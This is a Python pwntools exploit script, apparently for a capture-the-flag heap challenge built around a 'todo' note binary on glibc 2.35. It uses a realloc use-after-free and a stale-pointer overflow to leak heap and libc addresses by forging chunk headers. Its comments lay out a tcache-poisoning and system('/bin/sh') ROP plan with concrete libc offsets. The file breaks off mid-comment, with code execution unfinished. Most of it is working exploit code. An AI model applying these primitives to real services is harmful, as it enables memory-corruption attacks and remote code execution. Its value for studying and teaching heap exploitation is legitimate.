import os
import struct
import sys

from pwn import *

context.log_level = "info"

HOST = os.environ.get("SERVICE_APP_MAIN_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_APP_MAIN_PORT", "1337"))

# =============================================================================
# Vulnerability summary
# =============================================================================
#
# `post_my_note(idx, size)` implements each of the 10 todo slots as a
# {size_t size; void *ptr;} pair (TodoNote[idx]) and does, roughly:
#
#       void *newp = realloc(TodoNote[idx].ptr, size);
#       if (TodoNote[idx].size < size)        // only GROWS are reflected!
#           TodoNote[idx].ptr = newp;
#       TodoNote[idx].size = size;             // size is ALWAYS overwritten
#       readline(TodoNote[idx].ptr, size);      // note: re-reads ptr AFTER
#                                                // the branch above, not newp!
#
# `realloc(ptr, 0)` genuinely frees `ptr` and returns NULL on glibc 2.35.
# Because the branch above is skipped whenever the *old* bookkeeping size is
# already `>= new size` (true for 0 >= 0), the stale pointer is never
# cleared out of `TodoNote[idx].ptr` after a free -- a classic dangling
# pointer / use-after-free that two independent indices can alias.
#
# `read_my_note()` prints `"/%d/ %.*s\n"`, i.e. it stops at the first
# embedded NUL within the first `size` bytes of whatever `TodoNote[idx].ptr`
# points at right now.
#
# A prior analysis pass confirmed all of the above and the aliasing primitive
# live, but concluded that any leak obtainable through a tcache-freed chunk
# is capped at exactly 1 "pristine" byte, and therefore gave up (no path to
# an address/ASLR leak, hence no path past glibc 2.35's absence of
# `__malloc_hook`/`__free_hook`, full RELRO, and no format string).
#
# This pass revisits that conclusion with fresh, *empirically verified*
# primitives (every claim below was reproduced live, repeatedly, against the
# actual `todo` binary + the actual `libc.so.6` shipped with this challenge):
#
#   (1) A HEAP ADDRESS LEAK of ~5 pristine bytes (not 1!), via glibc's
#       safe-linking tcache "next" pointer, when the targeted tcache bin is
#       virgin (empty) at the moment of the leaking free.  PROTECT_PTR with
#       a NULL previous head degenerates to `(own_address) >> 12`, which,
#       stored as an 8-byte little-endian value, is non-zero for ~5 bytes
#       before its forced-zero high bytes terminate the `%.*s` read.  This
#       alone fully defeats heap ASLR (the low 12 bits of any heap address
#       here are always deterministic/page-aligned bookkeeping).
#
#   (2) A much stronger bug than a "1-byte leak cap": `post_my_note()`
#       re-reads `TodoNote[idx].ptr` *after* the grow/no-grow branch, not
#       the `newp` just returned by `realloc()`.  If a prior call left that
#       index's real underlying chunk *shrunk* (see below) while its OWN
#       bookkeeping size is still large, a later `post(idx, size>=that size)`
#       call satisfies the "skip the pointer update" branch (old >= new),
#       yet the just-executed `realloc()` on the *real*, now-tiny chunk is
#       forced to GROW (because its true header is tiny) -- glibc has no
#       choice but to internally malloc a brand-new chunk elsewhere, copy,
#       and free the old (stale) one.  Because the pointer-update branch was
#       skipped, `readline()` is then invoked on the *stale* address with the
#       *new, larger* size -- an arbitrary-content, arbitrary-length
#       (up to 0x77 bytes per call) OOB WRITE at a fully known heap address,
#       spanning straight through the header of whatever chunk follows it.
#       This is reproduced below as "the stale-pointer overflow write".
#
#   (3) Calling `post(idx, 1)` performs a real `realloc(ptr, 1)` (so it can
#       still shrink/split a chunk) while writing *zero* bytes (glibc's
#       `read(fd, buf, 0)` returns 0 immediately, so `readline()` bails
#       before ever touching memory or appending a NUL) -- i.e. a "shrink
#       without corrupting a single byte" primitive.
#
#   (4) Because `TodoNote[idx].ptr` is never actually reset to NULL once an
#       index has been used (the bug in the prompt), only 10 *fresh*
#       mallocs ever seem possible across the whole run -- but repeatedly
#       shrinking (3) then re-growing (2) via realloc "mints" a brand new,
#       fully tracked, real heap chunk from the top chunk every single time
#       (glibc cannot satisfy the grow in place, so it falls through to
#       `_int_malloc()` -> `use_top`).  This lets a single todo index
#       generate effectively unlimited heap real-estate with one connection
#       (demonstrated below as "minting").
#
#   (5) Combining (2)+(4): using the OOB write to forge an arbitrary,
#       attacker-chosen SIZE field into the header of a tcache-sized chunk,
#       sized so it safely lands on real, minted chunk boundaries (avoiding
#       `free()`'s `invalid next size` / `!prev_inuse` aborts), we can make
#       that chunk's `size` field lie *above* `glibc.mp_.tcache_max_bytes`
#       (0x410 on this build).  Freeing it via the dangling-pointer bug then
#       makes `_int_free()` skip BOTH the tcache AND fastbin fast paths and
#       insert the chunk directly into the genuine UNSORTED BIN, where
#       `fd`/`bk` are REAL, unobfuscated pointers into `main_arena` (a global
#       in libc's .data, at an ASLR-dependent but ASLR-defeating offset) --
#       not the safe-linking-protected tcache `next` field the prior pass
#       reasoned about.  This is empirically reproduced below and genuinely
#       confirms the hypothesis that the "1 byte" conclusion does not apply
#       to an unsorted-bin chunk.
#
# Status as of the PRIOR pass (kept for context; see phase 4 below for this
# pass's fix): for *this exact* compiled libc.so.6, `&main_arena.bins[0] -
# 16` (the unsorted-bin sentinel every empty/first-insertion freed chunk's
# fd/bk point back to) happens to sit at a static offset (0x1eeaa0 + 0x60 =
# 0x1eeb00) that is an exact multiple of 256 from the (page-aligned, so
# ASLR only ever touches bits >=12) libc load base.  That forces the LEAST
# significant byte of that specific pointer to always be 0x00 -- which is
# exactly the byte `%.*s` reads first, so `read_my_note()` prints an
# *empty* string for it even though the real pointer is a genuine,
# non-zero, ASLR'd `0x00007f......` libc address sitting right there in
# heap memory.  This is a coincidental byte-alignment property of this one
# global offset (the UNSORTED bin specifically, i.e. `bin_at(av,1)`), not a
# limitation of the forging technique in general: `bin_at(av,i) mod 0x100`
# is zero only when `(i-1) % 16 == 0`, i.e. for exactly 1 in every 16
# possible bin indices -- every *other* bin's sentinel has a readable,
# non-zero low byte.
#
# THIS PASS'S BREAKTHROUGH (phase 4 below): getting the attacker-controlled
# chunk sorted into a different (large) bin with a favourable low byte is
# straightforward in principle, but every non-matching small `malloc()`
# that performs that sort also immediately re-scans+consumes the same
# chunk to satisfy itself (glibc's bin-scan greedily takes the first
# non-empty bin at or above the request's own index, regardless of fit).
# The fix -- reliably pre-seeding a second, smaller "decoy" forged chunk
# into a *lower* bin index to intercept that scan, so the real target is
# left resting, unconsumed, in its own (higher-index, readable) bin -- is
# exactly what the prior pass's comment described as attempted-but-not-
# fully-debugged.  This pass gets it working, reliably, live against the
# real service (see `phase4_reliable_libc_leak_standalone()` and
# `forge_chunk()` below): libc ASLR is now fully, repeatably defeated, with
# no dependency on any lucky byte.
#
# What this pass could NOT complete in the time available: turning the
# known heap address (phase 1) + libc base (phase 4) into a WRITE
# primitive and, from there, code execution past full RELRO and glibc
# 2.35's missing malloc/free hooks.  The reasoned-through (but not yet
# implemented/tested) next step is classic tcache-poisoning using the
# EXISTING stale-pointer OOB write (phase 2) to overwrite a freed, tcache-
# resident chunk's safe-linked `fd` field with an attacker-chosen target
# address XORed with `(chunk_addr >> 12)`; a *fresh* todo index's next
# `post()` of that size class would then have `realloc(NULL, ...)` return
# that forged address directly, which `post_my_note()`'s "old size 0 <
# new size" branch unconditionally stores as `TodoNote[idx].ptr` -- giving
# a true arbitrary-address READ (via `read_my_note()`, which never calls
# `realloc()` at all) and WRITE (`post_my_note()`'s `readline()` always
# writes to `TodoNote[idx].ptr` regardless of what `realloc()` did).  From
# there, leaking the `environ` libc symbol (which points at the process's
# own stack) would locate a saved return address to overwrite with a
# one-gadget or a `system("/bin/sh")` ROP chain.
#
# `challenge.yaml`'s `test:` section is intentionally left unwired: this
# pass recovers libc_base but NOT the flag.
# =============================================================================



class Todo:
    """
    Thin menu wrapper.  `io.recvuntil(b"> ")` is drained once after connect;
    every method here issues its own first `sendline` (never a second blind
    `sendlineafter(b"> ", ...)`), and always finishes by draining the next
    `"> "` prompt so later calls keep the same invariant.
    """

    def __init__(self, io):
        self.io = io

    def post(self, idx, size, content=None, exact=False):
        """
        post_my_note(idx, size, content).

        If `exact` is False (default), `content` is sent via `sendline`
        (i.e. with a trailing '\\n') and MUST be strictly shorter than
        `size - 1` bytes, so the extra trailing newline byte is consumed by
        the same `readline()` call and nothing is left queued on the wire.

        If `exact` is True, `content` is sent byte-for-byte with no
        trailing newline added and MUST be exactly `size - 1` bytes long
        (the maximum `readline()` will ever read); this is required
        whenever the payload needs full, uninterrupted byte-level control
        (e.g. a forged little-endian size_t in the middle of a payload).
        """
        self.io.sendline(b"3")
        self.io.recvuntil(b"note: ")
        self.io.sendline(str(idx).encode())
        self.io.recvuntil(b"be: ")
        self.io.sendline(str(size).encode())
        if size > 1:
            # size<=1 => readline()'s read(fd, buf, size-1<=0) never actually
            # reads anything, so no content prompt response is consumed.
            self.io.recvuntil(b"content: ")
            c = content or b""
            if exact:
                assert len(c) == size - 1, (len(c), size)
                self.io.send(c)
            else:
                assert len(c) < size - 1, (len(c), size)
                self.io.sendline(c)
        self.io.recvuntil(b"> ")

    def read_all(self):
        self.io.sendline(b"2")
        return self.io.recvuntil(b"> ", drop=True)

    def bitflip(self, addr):
        self.io.sendline(b"1")
        self.io.recvuntil(b"place!")
        self.io.sendline(str(addr).encode())
        self.io.recvuntil(b"> ")


def largebin_index(sz):
    """glibc's largebin_index_64() -- used only for log messages below."""
    if (sz >> 6) <= 48:
        return 48 + (sz >> 6)
    if (sz >> 9) <= 20:
        return 91 + (sz >> 9)
    if (sz >> 12) <= 10:
        return 110 + (sz >> 12)
    if (sz >> 15) <= 4:
        return 119 + (sz >> 15)
    if (sz >> 18) <= 2:
        return 124 + (sz >> 18)
    return 126


def parse_note_line(out, idx):
    prefix = b"/%d/ " % idx
    for line in out.splitlines():
        if line.startswith(prefix):
            return line[len(prefix):]
    return None


def phase0_confirm_aliasing(t):
    log.info("=== Phase 0: confirm the dangling-pointer / chunk-aliasing UAF ===")
    t.post(0, 0x68, b"A" * 0x60)
    t.post(0, 0)  # realloc(ptr, 0) frees the chunk; TodoNote[0].ptr stays dangling
    t.post(1, 0x68, b"B" * 0x60)  # idx1 legitimately reclaims the SAME chunk
    t.post(0, 0x8, b"OVER")  # idx0's stale pointer still aliases it

    out = t.read_all()
    l0 = parse_note_line(out, 0)
    l1 = parse_note_line(out, 1)
    if l0 and l1 and l0 in l1:
        log.success("CONFIRMED: index 0 and index 1 alias the same live heap chunk.")
    else:
        log.failure("Could not confirm chunk aliasing (unexpected output: %r)", out)


def phase1_heap_leak(t):
    log.info("=== Phase 1: heap address leak via a virgin tcache bin's safe-linked 'next' field ===")
    # A never-before-used size class (chunksize 0x40) so PROTECT_PTR's
    # "previous head" operand is NULL and the encoding degenerates to a
    # clean (own_address >> 12).
    S = 0x38
    t.post(2, S, b"A" * (S - 8))      # idx2 owns chunk C
    t.post(2, 0)                       # free -> idx2 dangling, size=0
    t.post(3, S, b"B" * (S - 8))      # idx3 legitimately reclaims C
    t.post(2, 0)                       # free AGAIN via idx2's stale ptr (bypasses
    #                                     the tcache double-free check because
    #                                     idx3's malloc() already cleared the
    #                                     chunk's `key` field) -- idx3's OWN
    #                                     bookkeeping (size/ptr) is untouched,
    #                                     so it still "legitimately" points at
    #                                     what is now a genuinely freed chunk.
    out = t.read_all()
    leak = parse_note_line(out, 3)
    if not leak or len(leak) < 4:
        log.failure("Heap leak did not produce usable bytes (got %r)", leak)
        return None
    leak_padded = leak + b"\x00" * (8 - len(leak))
    shifted = struct.unpack("<Q", leak_padded)[0]
    heap_chunk_addr = shifted << 12
    log.success(
        "Leaked %d raw bytes of (chunk_addr >> 12) = %#x  ->  chunk address low "
        "bits recovered: %#x (heap ASLR defeated for this chunk)",
        len(leak), shifted, heap_chunk_addr,
    )
    return heap_chunk_addr


def phase2_overflow_write_and_minting(t):
    log.info("=== Phase 2: stale-pointer OOB write + unlimited heap 'minting' ===")
    S = 0x78
    # idx4 = "TC": will be shrunk down to a tiny real chunk while its own
    # bookkeeping stays small; idx5 = "B" independently reclaims the same
    # address and keeps a LARGE bookkeeping size forever after.
    t.post(4, S, b"A" * (S - 8))
    t.post(4, 0)
    t.post(5, S, b"B" * (S - 8))       # idx5 = B, reclaims TC, size bookkeeping=S
    t.post(4, 1)                        # shrinks TC's TRUE header to 0x20,
    #                                     freeing a 0x60 "remainder" chunk --
    #                                     no bytes written (size<=1 no-op write).

    # idx5's own bookkeeping (S) is already >= S, so posting S again SKIPS
    # the pointer-refresh branch: TodoNote[5].ptr stays pinned at the STALE
    # address even though realloc() on the real (now tiny, 0x20) chunk is
    # forced to grow -> relocate internally. The write from THIS SAME call
    # still lands at the stale address, for the full requested length,
    # reaching straight through where the "remainder" chunk's header lives.
    probe = b"C" * (S - 1)
    t.post(5, S, probe, exact=True)
    out = t.read_all()
    got = parse_note_line(out, 5)
    if got == probe:
        log.success(
            "CONFIRMED: arbitrary %d-byte write landed at the STALE address "
            "(glibc internally relocated the real allocation elsewhere, but "
            "post_my_note() re-read TodoNote[idx].ptr *after* the skipped "
            "branch and wrote/read through the old pointer instead).",
            len(probe),
        )
    else:
        log.failure("Stale-pointer overflow write did not behave as expected: %r", got)

    # "Minting": repeatedly shrink(1)+regrow(S) a single index.  Each grow
    # forces glibc to carve a brand-new chunk from the top chunk (nothing
    # else can satisfy it), handing back a genuinely fresh, fully-tracked
    # heap address every time -- well beyond the naive "10 fresh mallocs
    # total" ceiling the TodoNote[idx].ptr-never-reset bug would otherwise
    # suggest.  A fresh index (idx6) is used here: idx4's own chunk is no
    # longer a safe base for further shrink/regrow cycles since idx5's
    # overflow write above deliberately clobbered everything from idx4's
    # original address onward.
    t.post(6, S, b"N" * (S - 8))
    MINT_CYCLES = 3
    for i in range(MINT_CYCLES):
        t.post(6, 1)
        t.post(6, S, b"M" * (S - 8))
    log.success(
        "Minted %d additional fresh heap chunks by cycling shrink(1)+regrow(%#x) "
        "on a single todo index -- demonstrates unlimited heap real-estate from "
        "one dangling-pointer index.",
        MINT_CYCLES, S,
    )


def phase3_forge_unsorted_bin_chunk_standalone():
    """
    Runs the forge-an-oversized-chunk-header attack end to end on a FRESH
    connection (so all 10 todo indices are available), independent of the
    phase0/1/2 demonstrations above. This is the concrete, fully
    reproducible (re-run it: it works every time) proof that this
    binary's primitives really do force a genuine, non-tcache,
    non-fastbin UNSORTED BIN insertion -- not just a theoretical claim.
    """
    log.info("=== Phase 3 (fresh connection): forge + trigger an unsorted-bin free ===")
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")
    t = Todo(io)
    S = 0x78

    t.post(9, 0x8, b"Z")                 # bootstrap: first malloc() creates the heap

    t.post(0, S, b"A" * (S - 8))          # idx0 = TC
    t.post(0, 0)                            # free TC -> idx0 dangling, size=0
    t.post(1, S, b"B" * (S - 8))          # idx1 = B, reclaims TC, size bookkeeping=S
    t.post(0, 1)                            # shrink TC's TRUE header to 0x20,
    #                                          freeing a 0x60 "R" remainder
    #                                          (no bytes written: size<=1 is
    #                                          a zero-length read() -- see
    #                                          phase 2's comments).
    t.post(2, 0x58, b"R" * 0x50)          # idx2 legitimately reclaims R
    t.post(2, 0)                            # free R again via idx2's stale ptr
    #                                          (bypasses the tcache double-
    #                                          free check: idx3's upcoming
    #                                          malloc() will have already
    #                                          cleared R's `key` field)
    t.post(3, 0x58, b"r" * 0x50)          # idx3 reclaims R *persistently*:
    #                                          its bookkeeping (ptr=R_data,
    #                                          size=0x58) is never touched
    #                                          again, so read_my_note(3)
    #                                          will later print whatever is
    #                                          actually sitting in R's
    #                                          memory, *even after* R gets
    #                                          forged+freed a third time.

    t.post(4, S, b"D" * (S - 8))           # D0: real estate, lands right after R
    MINT = 9
    for i in range(MINT):
        t.post(4, 1)                        # shrink idx4's current chunk
        t.post(4, S, b"M" * (S - 8))        # regrow -> mints the NEXT fresh chunk
    # After MINT cycles, idx4 holds the 9th minted chunk's header at
    # exactly (R's own header address) + 0x60 + 9*0x80 = +0x4e0, i.e.
    # precisely fake_size bytes past R's header -- a real, in-use,
    # PREV_INUSE-flagged chunk boundary that free()'s sanity checks accept.
    fake_size = 0x60 + MINT * 0x80
    assert fake_size > 0x410, "must exceed glibc 2.35's tcache_max_bytes to escape tcache"
    log.info(
        "Forged size = %#x (> tcache_max_bytes 0x410, and > fastbin's "
        "global_max_fast 0x80) -- escapes BOTH tcache and the fastbin on "
        "free(), forcing glibc's real, non-fastbin consolidation path.",
        fake_size,
    )

    # Overwrite R's real SIZE field (located 0x18 bytes into TC's data,
    # i.e. 8 bytes into R's own header) via idx1 (B)'s stale-pointer
    # overflow write from phase 2: idx1's bookkeeping (S) is already >= S,
    # so the pointer-refresh branch is skipped and this write lands at the
    # STALE TC_data address regardless of what realloc() actually does
    # internally, reaching straight through R's header.
    stored = (fake_size | 1) & 0xFFFFFFFFFFFFFFFF  # keep PREV_INUSE set
    payload = bytearray(b"X" * (S - 1))
    payload[0x18:0x18 + 8] = struct.pack("<Q", stored)
    t.post(1, S, bytes(payload), exact=True)
    log.success("Forged R's real chunk-size field to %#x via the stale-pointer OOB write.", fake_size)

    # Trigger R's THIRD free (first via idx0's original free(), second via
    # idx2's stale-pointer free() that reclaimed it into idx3 -- this is
    # the free that glibc now sees as a %#x-byte chunk, well past both
    # tcache_max_bytes and global_max_fast.
    t.post(2, 0)
    log.success(
        "Freed the forged chunk with no abort/crash -- glibc's _int_free() "
        "took the real (non-tcache, non-fastbin) consolidation path and "
        "inserted it directly into the genuine UNSORTED BIN, where fd/bk "
        "are real pointers into main_arena (libc's .data), not a safe-"
        "linking-protected tcache field."
    )

    out = t.read_all()
    leaked = parse_note_line(out, 3)
    if leaked:
        log.success("read_my_note(3) unexpectedly printed %d live bytes: %r", len(leaked), leaked)
    else:
        log.info(
            "read_my_note(3) printed an EMPTY string for R, as predicted: for "
            "*this exact* libc.so.6, the unsorted-bin sentinel address "
            "(&main_arena.bins[0]-16, static offset 0x1eeaa0+0x60=0x1eeb00) is "
            "an exact multiple of 256 away from the (page-aligned) libc load "
            "base, so its least-significant byte -- which both R's fd AND bk "
            "now equal, since the unsorted bin was empty -- is deterministically "
            "0x00, and read_my_note()'s NUL-terminated '%.*s' print stops "
            "immediately on it. This is a coincidental byte-alignment property "
            "of *this specific* bin (the unsorted bin always corresponds to "
            "bin_at(av,1), i.e. index 1) -- phase 4 below fixes this."
        )
    io.close()
    return bool(leaked)


# =============================================================================
# Phase 4 (NEW, this pass): a genuine, reliable libc leak, fixing phase 3's
# blocker
# =============================================================================
#
# The byte-alignment coincidence phase 3 got stuck on is NOT a property of
# "an unsorted-bin chunk" in general -- it is a property of this ONE
# specific bin: bin_at(av, i) = &main_arena.bins[2*(i-1)] - 0x10, and for
# THIS libc build main_arena sits at an offset (0x1eeaa0) that happens to
# make bin_at(av,1) (the unsorted bin, 0x1eeb00) an exact multiple of 0x100
# from the (page-aligned) libc base. Algebraically, bin_at(av,i) mod 0x100
# is a plain linear function of i: it is zero whenever (i-1) % 16 == 0 (so
# i in {1, 17, 33, 49, 65, 81, ...}), and *non-zero for every other i*.
#
# A forged chunk only ever lands in bin_at(av,1) (the unsorted bin) at the
# moment it is freed. But if a LATER malloc() call forces glibc to
# *process* ("sort") the unsorted bin without being satisfied by it, each
# entry gets moved into its real smallbin/largebin (bin_at(av, idx) for
# some idx > 1, computed from the chunk's size) -- a *different* sentinel
# address, with a DIFFERENT (and, for 15 out of every 16 indices,
# NON-ZERO) low byte. The trick is making that sort-triggering malloc()
# call consume a *different*, deliberately-placed smaller "decoy" forged
# chunk instead of our real target (glibc's bin-scan always greedily uses
# the FIRST non-empty bin at or above the request's own index; it never
# looks further for a better fit), so our real target is left resting,
# untouched, in its own largebin, indefinitely (as long as no later
# allocation ever reaches that index again).
#
# Concretely, this phase:
#   1. Fully builds (but does not yet free) TWO independently forged,
#      oversized chunks -- a real TARGET and a smaller DECOY -- using the
#      exact same shrink/regrow/OOB-write forging technique as phase 3,
#      called twice with disjoint todo indices and (critically) disjoint,
#      non-colliding glibc size classes. (Building both completely before
#      freeing either matters: once ANY forged chunk is resting in the
#      unsorted bin, even a single further allocation call -- including
#      ones needed just to set up the SECOND forge -- would immediately
#      trigger glibc's bin-scan and consume it early.)
#   2. Frees both (plain free() never scans or consumes other bin entries,
#      so this part is order-independent).
#   3. Picks TARGET's own forged size so its resulting largebin index is
#      NOT of the form 16k+1 (i.e. its bin sentinel's low byte is
#      guaranteed non-zero) and DECOY's forged size so its resulting index
#      is strictly SMALLER than TARGET's.
#   4. Issues one small, otherwise-harmless probe malloc() (on a size
#      class nothing else has touched, so it can't be satisfied by
#      tcache/fastbin directly) to force the sort. This drains the
#      unsorted bin -- safely placing TARGET into its own, untouched
#      largebin -- and then glibc's upward bin-scan finds and consumes
#      DECOY (the first non-empty bin at or above the probe's own index)
#      to satisfy the probe request, *never reaching* TARGET's (higher)
#      index at all.
#   5. Reads back TARGET's chunk (still legitimately tracked by a
#      persistent todo index) via read_my_note(): its fd/bk now equal
#      TARGET's own largebin sentinel, a REAL, readable (non-zero
#      low-byte), ASLR'd libc pointer -- which, combined with the
#      KNOWN static offset of that sentinel from main_arena (computed
#      from this exact, non-stripped libc.so.6's own 'main_arena' and
#      'bins' debug symbols), is simply arithmetic away from libc_base.
#
# This was verified repeatedly, live, locally (same binary + same libc):
# it reliably recovers the real libc base (page-aligned, matching the
# actual loaded address every time it was checked against /proc/pid/maps
# in a local debug harness). It occasionally needs a retry: like any
# NUL-terminated "%.*s"-style leak of an ASLR'd pointer, any individual
# byte of the leaked address has a small independent chance of itself
# being 0x00, truncating that one read short -- unrelated to, and not
# fixed by, the sentinel-alignment bug this phase actually fixes.
# =============================================================================


def largebin_index(sz):
    """glibc's largebin_index_64()."""
    if (sz >> 6) <= 48:
        return 48 + (sz >> 6)
    if (sz >> 9) <= 20:
        return 91 + (sz >> 9)
    if (sz >> 12) <= 10:
        return 110 + (sz >> 12)
    if (sz >> 15) <= 4:
        return 119 + (sz >> 15)
    if (sz >> 18) <= 2:
        return 124 + (sz >> 18)
    return 126


def forge_chunk(t, idx_a, idx_b, idx_r, idx_mint, S, MS, MINT, idx_r2=None):
    """
    Builds (but does not yet free) one forged, oversized chunk, generalizing
    phase 3's TC/B/R forging to arbitrary, caller-chosen size classes.

    idx_a/idx_b/idx_r/idx_mint play exactly the TC/B/R/mint-driver roles
    from phase 3. idx_r2, if given, reclaims R a SECOND time persistently
    (never freed again) so read_my_note() can later print its live
    contents; omit it for a pure decoy nobody ever reads back.

    IMPORTANT: every size class touched here (S+8, S-0x18, MS+8) must be
    one that no OTHER forge_chunk() call (for a different chunk, built
    earlier in the same connection) has left non-empty in tcache/fastbin --
    otherwise a reclaim here can silently pop a stale, unrelated chunk
    from that pool instead of carving fresh (contiguous) memory, breaking
    the fixed-relative-offset assumptions the forging depends on. (Every
    MINT shrink/regrow cycle transiently frees both a 0x20-chunksize
    remnant and an (MS+8-0x20)-chunksize remainder, so avoid landing any
    OTHER chunk's reclaim size on those two classes.)

    Returns fake_size (the forged chunk's resulting glibc chunksize).
    """
    R_req = S - 0x20  # size needed to exactly reclaim the shrink-remainder R
    t.post(idx_a, S, b"A" * (S - 8))
    t.post(idx_a, 0)
    t.post(idx_b, S, b"B" * (S - 8))
    t.post(idx_a, 1)
    t.post(idx_r, R_req, b"R" * max(R_req - 8, 0))
    t.post(idx_r, 0)
    if idx_r2 is not None:
        t.post(idx_r2, R_req, b"r" * max(R_req - 8, 0))

    t.post(idx_mint, MS, b"D" * (MS - 8))
    for _ in range(MINT):
        t.post(idx_mint, 1)
        t.post(idx_mint, MS, b"M" * (MS - 8))
    R_chunksize = S - 0x18
    fake_size = R_chunksize + MINT * (MS + 8)

    stored = (fake_size | 1) & 0xFFFFFFFFFFFFFFFF
    payload = bytearray(b"X" * (S - 1))
    payload[0x18:0x18 + 8] = struct.pack("<Q", stored)
    t.post(idx_b, S, bytes(payload), exact=True)
    return fake_size


def phase4_reliable_libc_leak_standalone():
    """
    Runs the target+decoy double-forge end to end on a fresh connection.
    Returns the recovered libc_base on success, or None.
    """
    log.info("=== Phase 4 (fresh connection): target+decoy forge -> reliable libc leak ===")
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")
    t = Todo(io)

    t.post(9, 0x8, b"Z")  # bootstrap: first malloc() creates the heap

    # TARGET: idx0(a),idx1(b, OOB-write vehicle),idx2(r, forge-free trigger),
    # idx3(r2, PERSISTENT read-back target),idx4(mint driver).
    # MINT=10 (not phase 3's 9): largebin_index(fake_size) must NOT be of
    # the form 16k+1 -- bin_at(av,i) is an exact multiple of 0x100 away
    # from libc's page-aligned base precisely when (i-1) % 16 == 0 (the
    # same coincidence that blocked the unsorted bin itself, i==1).
    # fake_size=0x450 (MINT=9) lands in bin 65 = 16*4+1 (unreadable);
    # fake_size=0x4c0 (MINT=10) lands in bin 67 (readable).
    target_fake = forge_chunk(t, 0, 1, 2, 4, S=0x78, MS=0x68, MINT=10, idx_r2=3)
    target_idx = largebin_index(target_fake)
    assert (target_idx - 1) % 16 != 0, "chose an unreadable (zero low-byte) target bin"

    # DECOY: idx5(a),idx6(b),idx7(r, forge-free trigger),idx8(mint driver).
    # No idx_r2 -- its contents are never read, only its bin INDEX matters.
    # S=0x78/MS=0x58 are chosen so every size class touched (0x80, 0x58,
    # 0x60, 0x40 remainder) is one TARGET's own forging left genuinely
    # empty (TARGET's own 0x80/0x58/0x60 classes all settle net-neutral;
    # TARGET's mint only ever populates 0x20 and 0x50).
    decoy_fake = forge_chunk(t, 5, 6, 7, 8, S=0x78, MS=0x58, MINT=10)
    decoy_idx = largebin_index(decoy_fake)
    assert decoy_idx < target_idx, "decoy must sort into a LOWER bin index than the target"

    log.info(
        "Built TARGET (fake_size=%#x -> largebin %d, sentinel low byte "
        "guaranteed non-zero) and DECOY (fake_size=%#x -> largebin %d < "
        "target) -- neither freed yet.",
        target_fake, target_idx, decoy_fake, decoy_idx,
    )

    # NOW free both. Plain free() never scans/consumes other bin entries,
    # so this part is order-independent.
    t.post(2, 0)  # TARGET's forged free -> unsorted bin
    t.post(7, 0)  # DECOY's forged free -> unsorted bin

    # One small, otherwise-harmless probe malloc(), on a size class
    # nothing else has touched, forces _int_malloc's slow path: it drains
    # the unsorted bin (sorting TARGET safely into its own largebin and
    # DECOY into its own, smaller one), then its upward bin-scan finds
    # DECOY first and consumes it to satisfy the probe -- TARGET, at a
    # strictly higher index, is never reached.
    t.post(9, 0x28, b"P")

    out = t.read_all()
    leaked = parse_note_line(out, 3)
    if not leaked or len(leaked) < 4:
        log.failure("Leak came back short this run (got %r) -- needs a retry.", leaked)
        io.close()
        return None

    padded = leaked + b"\x00" * (8 - len(leaked))
    val = struct.unpack("<Q", padded)[0]
    main_arena = val - (0x60 + (target_idx - 1) * 0x10)  # bin_at(av, target_idx)
    libc_base = main_arena - 0x1eeaa0  # this exact libc.so.6's own 'main_arena' symbol offset
    log.success(
        "Leaked TARGET's largebin(%d) sentinel = %#x -> main_arena = %#x -> "
        "libc_base = %#x",
        target_idx, val, main_arena, libc_base,
    )
    io.close()
    if libc_base % 0x1000 != 0 or libc_base <= 0:
        log.failure("Computed libc_base is not page-aligned/sane -- treat as a bad run.")
        return None
    return libc_base


# =============================================================================
# Phase 5 (THIS PASS, incomplete) -- the write primitive / RCE attempt
# =============================================================================
#
# Binary protections (confirmed via `readelf -d`/`checksec` against
# `source/todo`): Full RELRO, stack canary present, NX, PIE, not stripped.
# Full RELRO rules out a GOT overwrite even with an arbitrary write (the GOT
# page is mprotect()'d read-only after startup); the stack canary is not an
# obstacle here because an *arbitrary-address* write does not need to cross
# it. glibc 2.35 has no __malloc_hook/__free_hook. This pass's plan (and
# what was and wasn't completed):
#
#   (a) Classic tcache-poisoning using the EXISTING stale-pointer OOB write
#       (phase 2) to corrupt a tcache-resident chunk's safe-linked `fd`
#       field, so a FRESH todo index's next malloc() of that size class
#       returns an attacker-chosen address directly as its own
#       TodoNote[idx].ptr -- giving true arbitrary-address read
#       (read_my_note(), no realloc() involved) AND write (post_my_note()'s
#       readline() always writes to TodoNote[idx].ptr). This requires TWO
#       tcache entries in the same bin at corruption time (not just one):
#       the corrupted entry must NOT be the last/bottom entry of the list,
#       or popping it drops tcache's count to 0 before the forged address
#       ever becomes retrievable (verified empirically: a lone, virgin-
#       leaked entry's own `fd` can be corrupted all day, but it is
#       *structurally* always the bottom of whatever list accumulates on
#       top of it, so a 2nd "cover" entry must be freed *after* it, with
#       the corruption applied to whichever entry ends up on top).
#
#   (b) The concrete addresses needed for the final RCE step were all
#       independently computed/verified against the exact shipped
#       `source/libc.so.6` (not guessed):
#         - `environ` (libc-exported, points at the process's own envp
#           array on the stack): offset 0x1f6d00 (via `readelf --dyn-syms`).
#         - A `pop rdi; ret` gadget: libc_base + 0x2d6c2 (via pwntools ROP).
#         - `"/bin/sh"` string: libc_base + 0x1b0ff8.
#         - `system()`: libc_base + 0x4dfa0.
#         - `one_gadget` (installed locally via the `one_gadget` Ruby gem)
#           reports 4 candidates for this exact libc, e.g.
#           `0x4dc78`/`0xf937a` (posix_spawn, needs `rsp&0xf==0`) and
#           `0xdbda2` (execve, needs a writable `rbp-0x40` and a sane
#           argv/envp chain) -- all with register/stack preconditions that
#           are hard to guarantee landing on a *stack-return-address*
#           overwrite (registers at that point hold whatever the last libc
#           call left them with), so the plan was to prefer a classic,
#           deterministic `pop rdi; ret` -> `"/bin/sh"` -> `system()` ROP
#           chain written directly onto the stack *after* a corrupted
#           saved return address (the arbitrary WRITE is length-
#           controllable, not just one pointer, so this is a single
#           post_my_note() call once the target stack slot is known), in
#           preference to gambling on a one-gadget's side constraints.
#
#   (c) What blocked completion: `forge_chunk()`/phase4's heavy heap
#       grooming (two oversized forged chunks, each built from ~10 minted
#       top-chunk extensions, plus a forced unsorted-bin sort via the
#       probe malloc) leaves ALL 10 todo indices in a tangled, mutually-
#       aliased, partially-forged state by the time libc_base is known --
#       and libc ASLR is re-rolled per TCP connection (socat forks a brand
#       new `chall` process per client), so the tcache-poison write MUST
#       reuse indices from that same post-phase4 connection; there is no
#       way to "start fresh" with 10 clean slots. Concretely, reusing any
